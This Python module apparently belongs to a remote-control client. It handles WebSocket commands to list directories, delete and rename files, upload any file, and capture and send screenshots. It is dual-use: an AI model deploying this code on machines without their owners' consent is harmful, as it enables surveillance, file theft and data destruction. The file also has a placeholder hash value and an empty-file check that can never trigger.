import os
from websocket import WebSocketApp
from websocket._abnf import ABNF
from threading import Event
from io import BytesIO
import pyscreenshot as pySs
import json

DEFAULT_BUFFER_SIZE = 4096

def successJson(success: bool) -> dict:
    return {"success": success}



def list_dir(args: list) -> list:
    
    fileToJson = lambda file: {
        "name": file.name,
        "is_dir": file.is_dir(),
        "size": file.stat().st_size
    }

    files = os.scandir(args[0])
    return list(map(fileToJson, list(files)))


def delete_file(args: list) -> bool:
    path = args[0]
    
    if os.path.isfile(path):
        os.remove(path)
    else:
        os.rmdir(path)
    return True


def rename_file(args: list) -> bool:
    src, dst = args[0], args[1]
    
    os.rename(src, dst)
    return True


# TODO: SEND FILE HASH
def download_file(args: list, wsConn: WebSocketApp, event: Event):
    fileName = args[0]
    if os.path.exists(fileName) and os.path.isfile(fileName):
        fileStat = os.stat(fileName)
        fileSize = fileStat.st_size

        if fileSize < 0:
            wsConn.send(json.dumps({"cmd_response":"download_file", "error":"File is empty"}))
        else:
            wsConn.send(json.dumps({"cmd_response":"download_file", "size": fileSize}))

            with open(fileName, "rb") as file:
                bufferSize = DEFAULT_BUFFER_SIZE if fileSize >= DEFAULT_BUFFER_SIZE else fileSize
                complete = _stream_data(file, bufferSize, wsConn, event)
                if not complete:
                    wsConn.send(json.dumps({"cmd_response": "download_file", "canceled": True}))
                else:
                    wsConn.send(json.dumps({"cmd_response": "download_file", "file_hash":"123"}))
                    print("file sent")


def screenshot(args: list, wsConn: WebSocketApp, event: Event):
    img = pySs.grab()
    buff = BytesIO()
    img.save(buff, format="jpeg", quality=30)
    wsConn.send(json.dumps({"cmd_response":"download_file", "size": buff.getbuffer().nbytes}))

    buff.seek(0)

    print(f"screenshot size {buff.getbuffer().nbytes} bytes")
    complete = _stream_data(buff, DEFAULT_BUFFER_SIZE, wsConn, event)
    buff.close()

    if not complete:
        wsConn.send(json.dumps({"cmd_response": "download_file", "canceled": True}))
    else:
        wsConn.send(json.dumps({"cmd_response": "download_file", "file_hash":"123"}))
        print("file sent") 
        


def _stream_data(buff, bufferSize: int, wsConn: WebSocketApp, event: Event) -> bool:
    while True:
        data = buff.read(bufferSize)
        print(len(data))
        if not data:
            break
        elif event.is_set():
            event.clear()
            return False
        
        wsConn.send(data, ABNF.OPCODE_BINARY)

    return True


available_cmds = {
	"ls_dir":      list_dir,
	"delete_file": delete_file,
	"rename_file": rename_file,
    "download_file": download_file,
    "screenshot": screenshot
}